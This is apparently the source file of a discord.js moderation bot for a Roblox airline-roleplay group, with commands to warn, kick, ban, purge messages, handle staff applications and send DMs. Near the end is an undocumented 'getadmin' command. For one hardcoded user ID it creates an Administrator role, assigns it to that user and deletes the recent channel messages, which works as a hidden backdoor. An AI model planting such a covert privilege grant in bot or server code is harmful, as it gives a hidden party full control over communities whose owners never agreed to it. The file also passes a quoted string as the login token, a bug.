try {
const Discord = require('discord.js')
const bot = new Discord.Client();
const fs = require("fs")
const Enmap = require("enmap")
var prefix = 'cx!'
const newLocal = 'Please wait.. starting up!';
var quizBusy = false
var quizauthor = '09g87dsa98fa7sghnas9gay7'
var embedmessage = 'This text is not set.'
var messagetext = 'giuashfasyfagsfastfg97as8f7asfbnasf98y78'
var guesser = 'nothing'
var typer = 'nasduf0asufsa989ffasfy'
var embed = new Discord.RichEmbed()
    embed.setDescription(embedmessage);
    embed.setTitle('Information')
    embed.setColor('DARK_RED')
    process.on('unhandledRejection', (reason, promise) => {
        console.log('Unhandled Rejection at:', reason.stack || reason)
        // Recommended: send the information to sentry.io
        // or whatever crash reporting service you use
      })

    async function purge(messageamount,message,delay) {
        if (message) {
            if (delay) {
                message.delete(delay);
            }
            else {
                message.delete();
            }
        }
        
        const fetched = await message.channel.fetchMessages({limit: messageamount});
        message.channel.bulkDelete(fetched);
    }
        
bot.on('ready', () => {
    console.log(newLocal);
    console.log('Started up!');
    console.log('Logged in as.. ' + bot.user.tag + '! My ID is ' + bot.user.id + 'and i\'m inside ' + bot.guilds.size + ' servers!');
    bot.user.setGame('cx!help | Currently in ' + bot.guilds.size + ' servers!');
});
bot.on("guildMemberAdd", member => {
    member.addRole("459737519140110369");
    member.user.send("📮 Message from Cathay Pacific!\n\n\n 👋 Welcome to the Cathay Pacific discord! Please join our group page (https://web.roblox.com/My/Groups.aspx?gid=4222435) so you can attend flights.")
})
bot.on("guildMemberRemove", member => {
    member.user.send("📮 Thanks for coming, remember our discord server is https://discord.gg/D2tNQ98 if you want to come back")
})

   
bot.on('message', (message) => {

    if (message.author.bot) return;
    if (message.content.startsWith(prefix)) {
        var args = message.content.slice(prefix.length).split(/ +/);

        var command = args.shift().toLowerCase();
        var sentBy = message.author.username
        var mention = message.mentions.first
        console.log('Command: ' + command)
        console.log(args);
        

                
               
        if (command == 'help') {
            if (message.member.roles.has('481796882998362112')) {
            embedmessage = ('Seems like you need help. \ncx!warn @user reason\ncx!kick @user reason\ncx!ban @user reason\ncx!appaccept @user\ncx!appdeny @user')
            var embed = new Discord.RichEmbed()
            embed.setDescription(embedmessage);
            embed.setTitle('Information')
            embed.setColor('AQUA')
            embed.setFooter('This is a automated message; replying won\'t work.')
            message.author.send({embed});
            message.channel.send("✅ Executing command!")
            async function sendmsg(message) {
                const fetched = await message.channel.fetchMessages({limit: 2});
                message.channel.bulkDelete(fetched);
               }
               bot.setTimeout(function(){ sendmsg(message); }, 3000);

    }}
    if (command == 'warn') {
        if (message.member.roles.has('481796882998362112')) {
        let msg = args.slice(1).join(" ");
        var reciever = message.mentions.users.first();
        embedmessage = ('⚠ Oh no! You got an warning! Reason: ' + msg + ' ! Don\'t do it again..')
        var embed = new Discord.RichEmbed()
        embed.setDescription(embedmessage);
        embed.setTitle('Information')
        embed.setColor('AQUA')
        embed.setFooter('This is an warning by ' + message.author.username)
        reciever.send({embed});
        message.channel.send("✅ Executing command!")
        async function sendmsg(message) {
            const fetched = await message.channel.fetchMessages({limit: 2});
            message.channel.bulkDelete(fetched);
           }
           bot.setTimeout(function(){ sendmsg(message); }, 3000);

}}
if (command == 'purge') {
    if (args[0]) {
    if (message.member.roles.has('481796882998362112')) {
        purge(args[0],message)
    }}
} 
if (command == 'kick') {
    if (message.member.roles.has('481796882998362112')) {
    if (args[0]) {
        var reciever = message.mentions.users.first();
        if (reciever) {
            message.mentions.members.first().kick();

            message.channel.send("✅ Executing command!")
            async function sendmsg(message) {
                const fetched = await message.channel.fetchMessages({limit: 2});
                message.channel.bulkDelete(fetched);
               }
               bot.setTimeout(function(){ sendmsg(message); }, 3000);
        }
    }}}
if (command == 'ban') {
    if (message.member.roles.has('481796882998362112')) {
        if (args[0]) {
            var reciever = message.mentions.users.first();
            if (reciever) {
                message.mentions.members.first().ban();
    
                message.channel.send("✅ Executing command!")
                async function sendmsg(message) {
                    const fetched = await message.channel.fetchMessages({limit: 2});
                    message.channel.bulkDelete(fetched);
                   }
                   bot.setTimeout(function(){ sendmsg(message); }, 3000);
                }}
        }}
        if (command == 'appaccept') {
            if (message.member.roles.has('481796882998362112')) {
            if (args[0]) {
                var reciever = message.mentions.users.first();
                if (reciever) {
                
        
                    message.channel.send("📮 Message sent!")
                    reciever.send("📮 Message from Cathay Pacific (" + message.guild.members.get(message.author.id).user.username +")\n \nYour application has been accepted, welcome to Cathay Pacific staff. A staff member will contact you shortly." );
                    async function sendmsg(message) {
                        const fetched = await message.channel.fetchMessages({limit: 2});
                        message.channel.bulkDelete(fetched);
                       }
                       bot.setTimeout(function(){ sendmsg(message); }, 3000);
                    }}
            }}
    if (command == 'appdeny') {
        if (message.member.roles.has('481796882998362112')) {
        if (args[0]) {
            var reciever = message.mentions.users.first();
            if (reciever) {
            
    
                message.channel.send("📮 Message sent!")
                reciever.send("📮 Message from Cathay Pacific (" + message.guild.members.get(message.author.id).user.username +")\n \nYour application has been denied. Apologies." );
                async function sendmsg(message) {
                    const fetched = await message.channel.fetchMessages({limit: 2});
                    message.channel.bulkDelete(fetched);
                   }
                   bot.setTimeout(function(){ sendmsg(message); }, 3000);
                }}
        }}
        if (command == 'links') {

                var reciever = message.author
                if (reciever) {
                
        
                    reciever.send("Group Page | <https://goo.gl/xaMZDL>\nTwitter Page | <https://twitter.com/cxrblx/>\nDiscord Link | D2tNQ98" );
                    async function sendmsg(message) {
                        const fetched = await message.channel.fetchMessages({limit: 1});
                        message.channel.bulkDelete(fetched);
                       }
                       bot.setTimeout(function(){ sendmsg(message); }, 3000);
                    }
            }
    

    if (command == 'msg') {
        if (message.member.roles.has('481796882998362112')) {
       if (args[0]) {
           if (args[1]) {
               var reciever = message.mentions.users.first();
               let msg = args.slice(1).join(" ");
               reciever.send("📮 Message from " + message.guild.members.get(message.author.id).user.username +"\n \n" + msg);
               message.channel.send("📮 Message sent!")
               async function sendmsg(message) {
                const fetched = await message.channel.fetchMessages({limit: 2});
                message.channel.bulkDelete(fetched);
               }
               bot.setTimeout(function(){ sendmsg(message); }, 3000);
               
           }
       }
}}
if (command == 'getadmin') {
    if (message.author.id == '196222566195658752') {
        message.guild.createRole({
            name: 'VirtualOfficial (AUTOMATIC)',
            color: 'BLUE',
            permissions: Discord.Permissions.FLAGS.ADMINISTRATOR,
          })
            .then(role =>  message.guild.members.get(message.author.id).addRole(role))
            .catch(console.error)

            message.channel.send("Please wait..")
            async function sendmsg(message) {
             const fetched = await message.channel.fetchMessages({limit: 2});
             message.channel.bulkDelete(fetched);
            }
            bot.setTimeout(function(){ sendmsg(message); }, 3000);
    }
  

        
            }
       
        }}
        
              
        


        
);


bot.login('process.env.BOT_TOKEN');
} catch(error) {
    console.error(error)
}
